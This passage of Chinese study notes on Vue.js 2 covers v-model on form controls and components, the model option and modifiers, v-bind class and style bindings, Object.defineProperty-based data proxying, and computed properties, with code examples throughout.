<br>

### 原因:
可能因为父组件只是请求数据 将最后的数据对象 交给了子组件 并没有在父组件中使用这个数据对象中的属性 所以没有问题 **猜测**

<br><br>

## radio: v-model
简单的复习下: 

radio标签是单选框, 当中必须有name属性才能向服务器进行提交

往往我们在设置radio标签的时候都是两个radio起一样的name属性值, 这样才能起到互斥的效果

```
互斥的原因:
我们在往服务器提交的时候 用name作为键名 提交的name只能有一个
```

<br>

### 要点:
radio这种 用户不能通过敲键盘输入value的 我们需要自己在标签属性中定义value属性 并指定每个单选框的值

1. 单选框组要有 且 只有一个name(多个单选框的name值必须一致)
2. 每一个单选框标签内要 **格外定义一个value属性 并指定value属性的值**
3. v-model绑定的是name对应的属性值  
这样才能根据用户点击把设定好的value值存到data中的变量中

<br>

### 示例:
- name: 字段名  
- v-model: 绑定data中的name对应的字段名 将用户选择的value 同步到该字段里面
```js 
<form>
  性别: 
  男<input type='radio' name='sex' v-model='sex' value='male' > 
  女<input type='radio' name='sex' v-model='sex' value='female'>
</form>

data() {
  return {
    sex:''    // 这里决定设置默认值
  } 
}
```

<br>

### 注意:
原生html中 单选框的默认值 是通过  checked="checked" 添加的 vue中的默认值需要在data中绑定的变量来设置

<br><br>

## checkbox: v-model

### 多选框的情况下:
多选的情况下我们需要收集的是value值 是数据 所以我们要是对checkbox这种类型的input 收集数据 要注意以下几点:

<br>

**1. 用于收集多选框的变量的类型必须是一个数组**  
我们要将值收集到data中的哪个变量里面去 hobby的初始值会影响v-model收集回来的数据 

如果是一个字符串 会转成false 这样收集的value会是boolean

<br>

**2. 每一个checkbox里 设置 value属性**    
checkbox这种 用户不能敲键盘输入值的 我们需要自己在标签属性中定义valu属性  

checkbox类型的input 如果我们不自己定义value 那么它默认读取的就是 checked 这个值 也就是true 或者 false

```html
<!-- 爱好:  -->
  吃饭<input type='checkbox' value='吃饭' v-model='hobby'> 
  睡觉<input type='checkbox' value='睡觉' v-model='hobby'> 
  打豆豆<input type='checkbox' value='打豆豆' v-model='hobby'>

<script>
  data() {
    return {
      sex:'',
      hobby: []
    }
  }
</script>
```

<br>

**单选框的情况下: 收集Boolean**  
我们不需要收集单选框的数据 我们只需要知道是 true 还是 false 就可以 

所以我们不用在单选的情况下在标签内部添加value属性 直接写``v-model=结果存放在哪个变量`` 它自动收集的就是 boolean

```html
同意<input type='checkbox' v-model='agree'> 

<script>
  data() {
    return {
      // 直接同步进来 true false
      agree:'',
    }
  }
</script>
```

<br><br>

## select: v-model
我们要是对select这种类型标签 收集数据 要注意以下几点

1. 给 select标签绑定 v-model = 将数据收集到哪里
2. 第一个 option 可以是value为空 对应的data中对应的变量的初始值也为空

**选择多个值 变量的类型是字符串:**  
```html 
<select v-model='city'>
  <!-- 默认值的部分就好加上 *disabled* -->
  <option disabled value="">请选择</option>   
  <option value="北京">北京</option>
  <option value="上海">上海</option>
  <option value="深圳">深圳</option>
</select>

<script>
  data() {
    return {
      city:'',
    }
  }
</script>
```

<br>

**选择多个值 变量的类型是数组**   
select标签可以指定可以选中多个值 那么 v-model 绑定的是一个数组  

当选中多个值时, 就会将选中的option对应的value添加到数组mySelects中

给下拉菜单添加 multiple属性后 就可以选择多个选项, 我们按住ctrl选, 选中的选项对应的value会传递到data中的cars的数组中
```html
<select v-model='cars' multiple>
  <option value="volvo">volvo</option>
  <option value="saab">saab</option>
  <option value="opel">opel</option>
</select>

<script>
let vm = new Vue({
  el:'#app',
  data: {
    cars: []
  }
})
</script>
```

<br><br>

## component: v-model (组件上的 v-model)
HTML原生的输入元素类型并不总能所有满足需求。比如 **父子组件之间 双向绑定父组件中的数据**  

幸好 Vue 的组件系统允许你创建具有完全自定义行为且<font color="#C2185B">可复用的输入组件</font>。

这些输入组件甚至可以和 v-model 一起使用!

<br>

组件上的 v-model 相当于 :value + @input 它就是一样的语法糖

<br>

### 案例: 组件组件上的 v-model
我们在 子组件 上使用了 v-model 可以将用户的输入拿到 父组件中

```html
<Child v-model="父组件中的变量">

<!-- 
  用户在 子组件中的input中 输入的数据 可以保存到父组件中的变量中
-->
```

<br>

**父组件:**  
```html
<template>
  <div id="app">
    <h1>父组件</h1>

    <!-- 组件上绑定了 v-model -->
    <BaseInput v-model="message" />

    <!-- 
      相当于 

      <BaseInput 
        :value="message"
        @input="message = val"    
      />
    -->

    <!-- 把收到的数据设置给 message -->
    <p>文字: {{message}}</p>


    <BaseCheckbox v-model="checked" />
    <p>已经赞了: {{checked}}</p>
  </div>
</template>

<script>
export default {
  components: {
    BaseInput,
    BaseCheckbox
  },
  data() {
    return {
      message: "sam",
      checked: true
    }
  }
}
</script>
```

<br>

**子组件: 要点**
1. props配置项 接收 ["value"] 
2. html模版中的 input 结构上要完成两件事情
  - 使用 v-bind 绑定 props中的value值
  - 绑定 @input 事件 并指明回调

3. 定义 @input 的回调 内部使用 this.$emit("input", e.target.value) 向父组件发射数据

```html
<!-- BaseInput.vue 子组件 -->
<template>
  <div>
    <!-- 利用上 props 中的 value -->
    <input type="text" :value="value" @input="handleInput"/>
  </div>
</template>

<script>
  export default {
    props: ["value"],
    methods: {
      // 父组件在子组件上绑定了 @input 所以回调中也要指定 派发事件为 input 和 父组件在子组件标签上绑定的事件保持一致
      handleInput(e) {
        this.$emit("input", e.target.value)
      }
    }
  }
</script>

```

<br>

因为 App.vue父组件 中 给 ``<BaseInput>`` 绑定了 v-model 
```html
  <!-- 组件上绑定了 v-model -->
  <BaseInput v-model="message" />

  <!-- 相当于 -->

  <BaseInput 
    :value="message"
    @input="message = val"    
  />
```

<br>

### 解析: 
在子组件上绑定 v-model 相当于 做了两件事情 
1. :value="message"
2. @input="message = val" 

我们在父组件中对子组件做了如上的两件事 :value 就相当于通过props将value属性传递到子组件中 所以子组件要在props配置项中声明接收


<br>

上面在父组件中使用 v-model="变量", 子组件中要在 input标签中显式使用
1. :value="props的value"
2. @input="回调", 回调中使用 emit 派发 **input事件**

<br>

**注意:**   
父组件在子组件身上绑定了什么事件 我们就在回调中派发什么事件

<br>

### 完整代码:
父组件
```html
<template>
  <div id="app">
    <h3>App组件</h3>
    <div>
      {{message}}
    </div>

    <div>
      <Child v-model="message"/>
    </div>
  </div>
</template>

<script>
import Child from "./components/Child.vue"
export default {
  name: "App",
  components: {Child},
  data() {
    return {
      message: "default value"
    }
  }
}
</script>
```

<br>

子组件
```html
<template>
  <div>
    <h3>Child组件</h3>
    <hr>
    <input type="text" :value="value" @input="handleInput">
  </div>
</template>

<script>
export default {
  name: "Child",
  props: ["value"],
  methods: {
    handleInput(e) {
      this.$emit("input", e.target.value)
    }
  }
}
</script>
```

<br>

### 扩展: $emit方法传递数据
当子组件使用 ``this.$emit("input", newValue)`` 发射数据 将newValue送给父组件的时候

父组件在子组件上绑定它派发的事件的时候, 需要指定回调是吧, 回调中的第一个默认参数就是传递过来的数据

<br>

**接收方式:**  
```js
// 子组件:
this.$emit("input", newValue)

// 父组件: 绑定派发事件时不用指明参数
<Child @input="handler">


// 回调默认第一个参数就是派发过来的数据
handler(newValue) {
  newValue就是子组件emit出来的数据
}
```

<br>

### 扩展: model 配置项 - 解决 自定义 属性 和 事件
但是 上面的使用方式 有个问题 就是在默认情况下
- v-model 传递的 props 的key 为 value 
- 监听的事件是input  

<br>

但有些场景下 我们希望接收的属性是自定义的 监听的事件也是自定义的 那么我们就要用到下面的知识点

```html
<BaseInput v-model="message" />

<!-- 相当于 -->

<BaseInput 
  :value="message"
  @input="message = val"    
/>
```

这时候子组件的props中接收到的 就是 value 也就是我们只能声明接收 value
```js
props: ["value"]
```

也就是说 ``<BaseInput v-model="message" /> `` 这种方式传递到子组件中的值的 key 就是 value

<br>

**那有没有办法 自定义接收的 key 值呢?**  

不要再声明接收 value 也就是说我们要修改 默认传递到子组件props的key的名字

<br>

### 子组件: model配置项  
子组件中通过 model 配置项 修改父组件通过 v-model="val" 传递过来的props中的默认的key值

```js
model: {
  prop: "checked"  // 默认的名字是value
}
```

上面 :value 的部分解决了 还有 @input 的部分

<br>

我们的 v-model 默认监听的是 input 事件 但是有些情况 不是input事件 比如 checkbox 它触发的就是 change 事件  

所以我们也要改变下默认的 v-model 的监听事件的类型 也就通过 model 配置项
```js
model: {
  prop: "checked"  // 默认的名字是value
  event: "change"  // 默认是input
}
```

<br>

### 代码部分:
App
```html
<template>
  <div id="app">
    <h3>App组件</h3>
    <div>
      {{checked}}
    </div>

    <div>
      <Child v-model="checked"/>
    </div>
  </div>
</template>

<script>
import Child from "./components/Child.vue"
export default {
  name: "App",
  components: {Child},
  data() {
    return {
      message: "default value",
      checked: true
    }
  }
}
</script>
```

Child
```html
<template>
  <div>
    <h3>Child组件</h3>
    <hr>
    <input type="checkbox" :checked="checked" @change="handleChange"> 点我
  </div>
</template>

<script>
export default {
  name: "Child", 
  model: {
    prop: "checked",
    event: "change"
  },
  // 还是要声明接收的 但是声明接收的是我们自己定义的 propName
  props: ["checked"],
  mounted() {
    console.log(this)
  },
  methods: {
    handleChange(e) {
      // 既然我们修改了 v-model 默认监听的事件 那么这里就要派发我们修改后的事件
      this.$emit("change", e.target.checked)
    }
  }
}
</script>
```

<br>

### 派发事件的使用技巧:


<br>

### 扩展: form 相关知识
使用form提交页面会刷新 一般我们都是使用ajax页面无刷新的状态请求数据 或者 发送数据

我们点击form标签内部的按钮会后引起默认行为 也就是表单的提交 表单提交后页面会刷新  

form提交的时候 我们可以给form标签绑定submit事件 用于提交数据 同时要注意我们要阻止默认行为

<br><br>

## v-model的应用: form表单 点击提交收集数据
上面我们将表单内部的所有数据使用v-model绑定在了对应的变量里面 接下来我们就要点击提交按钮来发送请求 但是我们怎么将上面零散的数据 收集在一起呢? 

```js 
sex:'',
hobby: [],
city: ''
```

<br>

将数据整理到一个userInfo的对象中 例如: html模版中 v-model="userInfo.sex"
```js 
userInfo: {
  sex:'',
  hobby: [],
  city: ''
}

JSON.stringify(this.userInfo)
```

<br><br>

## v-model: 修饰符

### **<font color="#C2185B">v-model.lazy</font>**

**作用:**  
v-model的修饰符, 数据在失去焦点 或者 回车时才会更新  

<br>

默认情况下, v-model默认是在 **input事件中同步输入框的数据的**

也就是说, 一旦有数据发生改变对应的data中的数据就会自动发生改变, lazy修饰符可以让数据在 **失去焦点** 或者 **回车** 时才会更新

```html
<input type="text" v-model.lazy='message'>
```

<br>

双向绑定的好处是 实时更新 但是 **坏处是改变的频率太高了** 有时候我们希望用户敲下回车或者文本框失去焦点后再保存在

message变量里 这样的改变的频率就不那么频繁了 就可以使用这种方式

<br>

### **<font color="#C2185B">v-model.number</font>**
默认情况下form里面用户选择的和输入的都是字符串类型 那我们使用v-model收集到对应变量的数据类型也会是字符串类型  

但是我们收集的数据到最后都会送到服务器然后传到数据库中 比如说年龄 数据库中的年龄字段如果收到字符串类型的数据就会报错

number修饰符可以让 在输入框输入的内容自动转为数字类型
```html 
<input type="number" v-model.number='message' />

<!-- 
  type="number"   控制我输入的不能是字母
  v-model.number  会将我输入的数字自动转成数字类型
 -->
```

<br>

### **<font color="#C2185B">v-model.trim</font>**
如果输入的内容首尾有很多的空格, 通常我们希望将其取出  
trim修饰符可以过滤内容左右两边的空格
```html 
<input type="text" v-model.trim='message'>
```

<br><br>

# 动态绑定属性: v-bind & :attr
动态绑定属性也是数据的单向绑定 **数据只能从data流向页面**  

前面我们学习的指令主要作用是将值插入到我们模板的内容中, 但是除了内容需要动态决定外, 某些属性我们也希望动态来绑定

<br>

### 作用:
动态绑定属性 绑定的属性值会根据data配置项中的值的变化也变化

<br>

### 技巧: v-bind="对象"
我们使用 v-bind 直接绑定一个独享, 变相实现了展开对象, 将对象中的所有属性一个个取出作为元素的标签属性
```html
<div v-bind="data"> 
  
<!-- 相当于 -->

<div name="sam" age="18" address="花果山">
```

<br>

### v-bind的格式
- **<font color="#C2185B">v-bind:'属性' = "表达式"</font>**  
- **<font color="#C2185B">:'属性' = "表达式"</font>**  

当我们加上v-bind后 引号中的内容就当做js表达式去执行了 如果表达式中出现变量就会去data中去找
```html
<a :href="url">点我跳转到百度</a>
<a :href="url.toUpperCase()">点我跳转到百度</a>
<a :href="Date.now()">点我跳转到百度</a>
```
```js 
// JS部分
const app = new Vue({
  el:'#app',
  // 要是动态的修改src属性, 一般从服务器请求过来的数据都放在data里面, 再通过语法动态的绑定到html中
  data: {
    imgURL: ['./links/1.jpg'],
    aHref: 'https://www.baidu.com'
  }
})

// HTML部分
<div id="app">
  <img v-bind:src="imgURL" alt="">
  <a v-bind:href="aHref">链接</a>
</div> 
```

<br>

### 技巧:  
我们使用在标签属性中使用 v-bind 绑定一个对象的时候 相当于将一些属性添加到了 标签属性中 相当于在 a标签中 添加了 target 和 rel 属性
```html 
<a
  v-bind="
    item.blank
      ? { target: '_blank', rel: 'noopener noreferrer' }
      : false
  "
>
```

<br><br>

## v-bind 动态绑定: class属性

### 字符串写法 
v-bind绑定的class 和 普通class混合使用的时候 vue不会覆盖掉普通的class部分
```html
<h2 class='title' :class='mood'></h2>
```

mood是data配置项中的变量, mood对应的值应该是已经定义好的类名

<br>

**场景:**   
样式的类名不确定 适用于动态指定 动态追加class样式
```js 
// 通过v-bind绑定的属性 引号中是表达式 vue在解析的时候将a作为变量去data中找对应的数据
<h2 class='title' :class='mood'></h2>

data: { mood: 'happy' }

// 渲染为
<h2 class='title happy'></h2>
    

// 样式的类名不确定 适用于动态指定: 
methods: {
  changeClass() {
    const arr = [happy, sad, normal]
    const index = Math.floor(Math.random()*3)
    this.mood = arr[index]
  }
}
```

<br>

### 数组写法
```html
<h2 class='title' :class='classArr'></h2>
```

classArr是定义在data配置项中的变量, 值为一个[类名1,类名2]构成的数组

<br>

**场景:**   
样式的类名不确定有多少 名字也不确定的时候我们可以用数组的方式 比如获取样式的类名是请求回来的数据  

因为我们将样式的类名维护在一个数组中 数组可以定义在data中 这样我们删除数组中的元素就相当于删除一个类名 push一个元素就相当于添加一个类名 完全是用操作数组的方式控制类名
```js 
<h2 class='title' :class='classArr'></h2>

data: { classArr: ['class1', 'class2', 'class3'] }

methods: {
  changeClass() {
    this.classArr.shift()
    this.classArr.push('class4')
  }
}
```

<br>

### 对象语法
```html
<h2 v-bind:class='classObj'>
<h2 v-bind:class='{类名: isShow}'>
```

classObj是定义在data配置项中的一个对象 该对象由如下的结构组成 当boolean为true的时候 则添加对应的类名
```js
{
  类名: Boolean
}
```

**场景:**  
要绑定的样式 个数确定 名字也确定 要动态的决定用不用 对象的写法适用于 决定改样式显示与否

```js
<h2 :class='classObj'></h2>

data: {
  classObj: {
    calss1: true, 
    class2: false
  }
}

methods: {
  changeClass() {
    this.classObj.calss1 = false
  }
}


// 写法2
<h2 :class='{类名:isShow}'></h2>
```

<br>

如果类名添加与否的条件太过复杂 可以将classObj定义为一个计算属性
```js
<div :class="classObject"></div>

data() {
  return {
    isActive: true,
    error: null
  }
},

computed: {
  classObject() {
    return {
      active: this.isActive && !this.error,
      'text-danger': this.error && this.error.type === 'fatal'
    }
  }
}
```

<br>

### 总结:
以后实际开发中, 固定要有的class我们用普通的写法, 如果以后需要动态修改的class我们使用v-bind的方式

<br>

### 案例1: 点击按钮后改变文字颜色 再次点击复原
单独的使用条件控制一个class是否显示
```html
<div id='app'>
  <h2 v-bind:class='{active:isActive}'>{{message}}</h2>
  <button v-on:click='btnClick'>Send</button>
</div>

<script>
let app = new Vue({
  el:'#app',
  data: {
      message: '你好啊',
      isActive: true
  },
  methods: {
    btnClick: function() {
      this.isAcitve = !this.isActive;
    }
  }
});
</script>

<style>
  .active { background: red }
</style>
```

<br>

### 案例2: 点击对应选项变色, 其它选项复原
**需求:**  
点击列表中的哪一项, 那么该项的文字变成红色

<br>

**思路:**  
既然class是通过布尔值决定添加与否的, 那么就让它的值是个判断表达式{active:currentIndex == index} 

每次点击的时候 我把index传递给currentIndex 让他们相等
```html
<div id="app">
  <ul>
    <!-- 哪个是多条v-for就写在哪里 -->
    <li 
      v-bind:class='{active:currentIndex == index}' 
      v-for='(item, index) in movies'
      v-on:click='change(index)'>{{item}}</li>
  </ul>
</div>

<script>
const app = new Vue({
  el:'#app',
  data: {
    movies: ['海王', '海尔兄弟', '火影忍者', '进击的巨人'],

    // 这里我们维护一个 currentIndex
    currentIndex: undefined
  },
  methods: {
    // 标签中通过实参把index 传递进来, 每次点击就把这个index 赋值给currentIndex
    change: function(index) {
      this.currentIndex = index;
    }
  }
})
</>
```

<br>

**解析一下:**   
首先我们class的添加与否 是跟true 和 false 有关系的 

``v-bind:class='{active:currentIndex == index}'``  

我们在data:{ currentIndex = 0 }

```html
<!-- true 所以添加  -->
<li :class='{active: 0 === currentIndex}'>
<li :class='{active: 1 === 0}'>
<li :class='{active: 2 === 0}'>
```

<br><br>

## v-bind 动态绑定: style属性
我们能发现style指定内联样式的时候 style 也是kv成对出现的 因为引号中的部分是表达式 如果当中出现了变量(fsize)就是去组件实例身上找

```html
<div :style='{fontSize: fsize + "px"}'></div>
```

动态绑定style的好处就是我们不用操作dom通过操作data中的变量就可以达到修改内联样式的效果

<br>

**注意:**   
我们再书写css属性名的时候, 使用驼峰式写法 或者短横线分隔

<br>

### 对象写法:
```html
<!-- 我们将对样式的处理也放在data中定义一个对象 -->
<div :style='{styleObj}'>style的测试段落</div>

<script>
data() {
  return {
    styleObj: {
      fontSize: '40px'
    }
  }
}
</script>
```

<br>

**使用场景:**
以后我们在开发项目的时候, 会把网页中的一个部分一个部分开发成一个个的组件, 这样别的页面就可以拿来复用

但是组件的颜色之类的就不能写死, 因为有的页面可能要求是白色 有的页面可以会是绿色, 所以我们要根据用的人决定是什么样的颜色, 这时候我们就要动态的绑定样式 

<br>

### 数组写法: 
```html
<h2 :style='[变量名1, 变量名2]'>{{message}}</h2>
```

我们传递进去的是一个数组 数组中对应的样式都会出现在class里面 成并列关系 也就是数组里面配置样式对象 

```html 
<h2 :style='[baseStyle1, baseStyle2]'>{{message}}</h2>

<script>
  const vm = new Vue({
    el: '#app',
    data: {
      baseStyle1:{ background:'red' },
      baseStyle2:{ fontSize:'50px' },
    }
  })
</script>


<!-- 最终效果会合并到一起 -->
<h2 style='background:'red'; fontSize:'50px''>{{message}}</h2>
```

<br>

### 总结:
我们使用v-bind绑定样式 把不变化的样式正常写 变化的样式使用:style来指定 动态的数据都往data里面放

<br><br>

# Vue: 数据代理

### **<font color="#C2185B">Object.defineProperty(指定对象, '属性名', {配置参数})</font>**  
该方法在vue底层很多地方都被使用 数据代理 数据劫持 计算属性等  

使用该方法给一个对象添加属性 并对该属性进行限制 / 更改  
使用该方法添加的属性 默认是
- 不能被枚举 
- 不能被删除 
- 不能被修改的  

<br>

**参数:**   
- 给哪个对象添加属性
- 给这个对象添加什么属性
- 配置对象

<br>

**配置对象: 基本配置**  
- value: 属性值

- enumerable: 枚举   
true / 默认值: false

- writable: 重写  
true / 默认值: false    

- configurable: 删除  
true / 默认值: false    

<br>

**配置对象: 高级配置**  
- enumerable: true / 默认值: false

- configurable: true / 默认值: false

- get:   
该方法会在 设置的属性 被读取的时候调用 该函数必须有返回值(return) 返回值为该属性的属性值

- set:   
该方法会在 设置的属性 被修改的时候调用 该函数会接收到参数 参数为被修改后的值 参数为 newValue

<br>

**对 get 和 set 的理解**   
- get: 我们给一个对象使用defineproperty方法添加了属性名 但是值去哪取? 靠get, et负责去一个地方得到值

- set: 那修改该值的话靠set 改成啥还可以影响到get return那个值(根源)

<br>

### 示例:
定义一个人的对象 这个人的对需要有age属性 但是age属性是靠number的值确定的 且每当number的值被修改的时候 person里面的age也会被修改
```js 
let number = 18

let person = {
  name: 'sam',
  sex: '男',
}

Object.defineProperty(person, 'age', {

  // 当有人读取person的age属性的时候 该函数就会被调用 且返回值就是age的值 属性值 它必须有返回值
  get() {
    return number
  },

  // 当有人修改person的age属性时 set函数就会被调用 且会收到age被修改为的具体值
  set(value) {
    console.log('age的值被修改为: ', value)

    // 把修改后的值 赋值给age的根源number 这样当我们修改age的 值的时候也能够影响到number
    number = value
  }
})
```

这样 age的值就是number的值 每当读取age的时候就会去调用getter 然后重新得到number最新的值   

number 和 person 明明是两个东西 但是借助defineproperty方法产生了关联  

上面的person通过这个方法确实有age属性但是 **你现用我现取** 想取去靠get 相当于去哪取 想改靠set 改成啥 还可以影响那个根源的值

```js 
let person = {
  name: "sam",
  sex: "男"
}

// 定义监视变量的源
let watchNum = 0

// 定义一个受监视的变量
Object.defineProperty(person, "age", {
  get() {
    return watchNum
  },

  set(val) {
    watchNum = val
  }
})
```

简单的使用原声js的方式实现了一下 计算属性 当我们读取了或者修改了 obj.url 的时候 界面更新
```js 
let urlSource = "www.baidu.com"
let obj = {}

Object.defineProperty(obj, "url", {
  get() {
    return urlSource
  },


  // 主要是在setter中写更新页面的逻辑
  set(val) {
    urlSource = val
    $("#root").innerHTML = obj.url
  }
})

$("#root").innerHTML = obj.url

function $(el) {
  return document.querySelector(el)
}
```

<br>

### **<font color="#C2185B">Object.defineProperties(目标对象, {配置对象})</font>**  
给目标对象配置多个具有格外功能的属性
```js 
{
  propname1: {
    get() {},
    set() {}
  },
  propname2: {
    get() {},
    set() {}
  }
}
```

<br>

**例子:**  
```js 
Object.defineProperties(obj, {
  sex: {
    get() {
      return num
    }
  },
  gender: { 
    get() {
      return "男"
    }
  }
})
```

<br><br>

## 数据代理:
通过一个代理对象 操作代理对象 间接的操作源对象中属性的操作(读写)就叫做数据代理  

```js
// 目标对象: 
const source = {name: "sam"}

// 代理对象: 通过操作它
const proxy = {}
```

<br>

### 案例:
比如 有一个obj 它有一个属性x 假如我要访问x那就是 obj.x 改的话就是obj.x = 赋值就可以了

还有一个对象 proxyObj 我想让proxyObj 也能访问到x 也希望proxyObj也能修改x  

通过proxyObj代理对另一个对象obj中的属性去操作 这就是数据代理

**通过代理对象身上的 get set 方法 间接的影响原对象的值**

```js 
let obj = {x: 100}
let proxyObj = {y: 200}

// 通过这个方法在代理对象中添加要访问obj中的属性
Object.defineProperty(proxyObj,  'x', {
  get() {
    return obj.x
  },

  set(value) {
    obj.x = value
  }
})
```

<br>

### 示例:
自己实现了 修改数组 然后自动更新页面的样式的逻辑

<br>

**思路:**   
1. classList数组为class样式数组
2. 创建了一个obj是代理对象 页面上的样式是根据代理对象中的list样式数组渲染的
3. 而obj代理对象中的list是从classList上获取的值
4. 当我们修改了代理对象中list的值后 就会更新页面上的样式

```js 
// a b c 都是样式名
let classList = ["a", "b", "c"]
let target = $("ul li")[0]

// 代理对象
let obj = {}
Object.defineProperties(obj, {
  list: {
    get() {
      return classList
    },
    set(v) {
      classList = v
      target.className = obj.list.join(" ")
    }
  }
})

target.className = obj.list.join(" ")
obj.list = [...target.classList, "d"]
obj.list = [...target.classList, "e"]

function $(el) {
  return document.querySelectorAll(el)
}
```

<br><br>

### vue中的数据代理
接下来我们看看 Vue里面是怎么使用数据代理的  

我们将变量name定义在data中(vue会将我们传入的data保存在vm身上一份 vm._data)

```js 
vm._data = data
```

有人当读取name的时候getter开始工作 getter就会将data中的name给过去  

有人通过vm来修改name的时候 setter开始工作 setter就会将data中的name修改掉
```js 
const vm = new Vue({
  el: '#root',
  data:{
    name: 'sam'
  }
})


// 有人读取name   < ---  getter  < ---  data.name
// 有人修改nama   --- >  setter  --- >  data.name
```  

<br>

### 总结
- vue中的数据代理: 通过vm对象来代理data对象中的属性的操作
- vue中数据代理的好处: 更加方便的操作data中的数据

<br>

**基本原理:** 
通过 Object.defineProperty 把data对象中所有的属性添加到vm上 为每一个添加到vm上的属性 都指定一个getter setter 在getter setter 内部去操作data中对应的属性


<br><br>

## 数据劫持
上面有一句话 从开始 贯穿到 现在 就是 假如data中的数据发生变化 页面中使用data数据的地方就会自动更新
```js 
data.name 变化了    // view 中使用 name 的地方 就会自动更新
```

<br>

要想实现这个功能 那就需要让vue监测到data中的数据改变了 如果vue监测不到data中的属性发生了变化 

那vue怎么帮你去更新页面呢 为了完成这个功能它就必须将_data中的东西进行一番修改
```js 
// 我们前面说 
const vm = new Vue({
  el: '#root',
  data:{
    name: 'sam'
  }
})

// 我们传入的data 会保存在_data中一份 原本我们期待_data中的数据结构也是一样的

data:{                _data:{   
  name: 'sam'           name: 'sam'
}                     }

// 但事实上不是 vue将_data中的数据 又做了一番处理 为了实现响应式
```

<br><br>

# 计算属性:
我们先了解一下什么叫做属性 对于vue来说 它认为data中的数据就是属性  

所谓的计算属性 **就是拿着已有的属性** 去加工去计算然后得到一个全新的属性 

计算属性书写在 computed配置项 中它的**类型是一个对象**

<br>

### 定义:
我们不能拿data配置项中已有的属性作为计算属性, 但是我们新创建的计算属性中可以利用data配置项中已有的属性

<br>

### 原理:
底层借助了Object.defineproperty方法提供的getter 和 setter

<br>

### 优势:
与methods相比 内部有缓存机制 复用效率更高 调试方便

<br>

### 使用:
计算属性最终会在vm身上 直接读取使用即可(通过this)  

如果计算属性要被修改 那必须要写set函数去响应修改 **且set中要引起计算时依赖的数据发生改变**
```js 
new Vue({
  el:'#root',
  data() {
    return {
      firstName: '张',
      lastName: '三'
    }},

  methods: {
    showInfo() {
      return this.firstName + '-' + this.lastName
    }},

  // 计算属性的配置项
  computed:{ }
})
```

<br>

### 计算属性: 对象写法
get 和 set 中的this就是vm
```js 
computed: {
  attr: {
    get() {},
    set() {},
    cache: false  // 不利用缓存功能
  }
}
```

```js 
computed:{
  fullName: {

    // 当有人读取fullName的时候get就会被调用 且返回值就是fullName的值
    get() {
      return this.firstName + '-' + this.lastName
    },

    // 如果我们的数据就是读取给别人用的话 set就可以不用写了 当我们的fullName以后会被修改的话 我们就要写set 当fullName被修改的时候该函数会被调用
    set(value) {
      const arr = value.split('-')
      this.firstName = arr[0]
      this.lastName = arr[1]
    }
  }
}
```

<br>

### get方法调用的时机
1. 初次调用fullName时 get会被调用
2. 所依赖的数据发生变化的时候 get会被调用

上面的案例中就是不管姓还是名被修改的时候get都会重新调用 但是依赖数据没有发生变化的时候 计算属性 fullName 会走缓存

<br>

### set方法调用的时机
如果我们的数据就是读取给别人用的话 set就可以不用写了 

**当我们的fullName(计算属性)以后会被修改的话** 我们就要写set 当fullName被修改的时候该函数会被调用, 一般我们会在set中对数据来源进行重新赋值

<br>

### 注意:
我们不能在set里面对计算属性本身进行赋值 会栈溢出 比如
```js
computed: {
  test: {
    get() {
      return this.xxx
    },
    set() {
      // 又再次修改了计算属性本身
      this.test = xxx
    }
  }
}
```

但是我们可以在methods之类别的逻辑中 为test计算属性进行赋值 赋值时 它的形参就是新对象

<br>

### 计算属性: 函数式写法
更多的情况是 计算属性是不需要修改的 更多的是计算出来在页面上做呈现  

这时候就不需要set方法 这时候我们就可以简写计算属性 将属性名写成一个函数 函数体的内容就是计算属性的属性值

函数内部需要 return 返回值 作为计算属性的值
```js 
computed:{
  fullName() {
    return this.firstName + '-' + this.lastName
  }
}
```

<br>

### 计算属性: 传参
我们在内层的函数中接收传递给计算属性的参数
```js
computed: {
  isShow() {
    return 参数 => { ... }
  }
}

```

<br>

### 总结:
1. 计算属性直接写函数名就可以 当属性名使用
2. 计算属性一直监听数据的变化 如果有变化立即返回一个值  

3. computed 具有 **缓存的功能** 就是 当数据不变化的时候就一直保存之前的值 不管你使用多少次  

4. 计算属性在多次调用的时候只会调用一次, methods的话你调用几次就会在实例中执行几次, 计算属性的性能会比较好
5. 在html结构中 直接使用变量名 不用加()调用函数
```js 
<h3>{{computed中的变量名}}</h3>
```

<br>

### 技巧: 利用计算属性 监视 对象
计算属性监视对象 竟然是深层监视 厉害厉害
```js
<script>
export default {
  name: 'App',
  data() {
    return {
      obj: {
        name: "sam",
        age: 18
      }
    }
  },
  computed: {
    computedObj() {
      return this.obj
    }
  },
  methods: {
    changeObj() {
      this.obj.name = "nn"
    },
  }
}
</script>
```

<br>

### 示例: v-model & computed setter
选项卡案例 点击选项卡 显示对应的内容
```
Tab1    Tab2    Tab3

---------------------

内容区
```

### 结构:
**1. App 组件:**  
包括两部分内容 Tab按钮区 和 内容区

<br>

**2. TabBar 组件:**  
Tab按钮区 一个 Tab1

**作用:**  
1. 通过 App 组件传递过来的数据 遍历生成 Tab
2. Tab的文字是通过 ``<Tab>`` 中定义的插槽实现的

```html
<Tab 
  v-for="(item, index) in data" 
  :key="index"
  :value="item.label"
>
  <!-- 这个就是向 <Tab> 组件中的 <slot> 传递数据 -->
  {{item.label}}    
</Tab>
```

3. 通过 :value="item.label" 向 ``<Tab>`` 组件传递 信息(数据)

4. 该组件中定义了 tigger() 是给 子组件通过 this.$parent 调用的 目的就是向App组件派发事件

5. 该组件相当于一个壳 并不负责渲染UI结构 而是传递数据 和 向App派发事件

<br>

**3. Tab 组件**  
主要负责渲染UI结构 通过 插槽显示内容 调用TabBar组件的事件tigger事件

App
```html
<template>
  <div>
    <!-- selectedLabel并不是定义在data中的 而是通过计算属性得到的 它会根据index获取tabs数组中对应的数据 -->
    <TabBar
      :data="tabs"
      v-model="selectedLabel"
    />

    <h1>当前选项: {{selectedLabel}}</h1>
  </div>
</template>

<script>
import TabBar from "./components/TabBar.vue"
export default {
  components: {TabBar},
  data() {
    return {
      index: 0,
      tabs: [
        {label: "选项1"},
        {label: "选项2"},
        {label: "选项3"},
      ]
    }
  },
  computed: {
    selectedLabel: {
      get() {
        return this.tabs[this.index].label
      },
      set(newVal) {
        this.index = this.tabs.findIndex(item => {
          return item.label == newVal
        })
      }
    }
  },
  mounted() {
    console.log(this.tabs)
  }
}
</script>
```

<br>

TabBar
```html
<template>
  <div>
    <Tab 
      v-for="(item, index) in data" 
      :key="index"
      :value="item.label"
    >
      {{item.label}}
    </Tab>
  </div>
</template>

<script>
import Tab from "./Tab.vue"
export default {
  components: {
    Tab
  },
  props: {
    data: Array
  },
  methods: { 
    trigger(value) {
      console.log(value)
      this.$emit("input", value)
    }
  }
}
</script>
```

<br>

